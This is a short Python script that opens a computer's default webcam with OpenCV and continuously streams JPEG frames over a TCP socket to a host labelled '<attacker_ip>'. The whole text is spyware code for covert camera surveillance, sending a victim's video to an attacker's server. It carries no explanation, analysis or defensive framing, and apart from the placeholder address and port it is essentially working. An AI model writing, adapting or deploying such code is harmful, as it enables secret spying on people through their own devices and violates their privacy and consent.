import cv2
import socket

server_ip = '<attacker_ip>'
server_port = <port>
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

camera = cv2.VideoCapture(0)

while True:
    ret, frame = camera.read()
    if not ret:
        break
    _, buffer = cv2.imencode('.jpg', frame)
    client_socket.sendall(buffer)

camera.release()
client_socket.close()
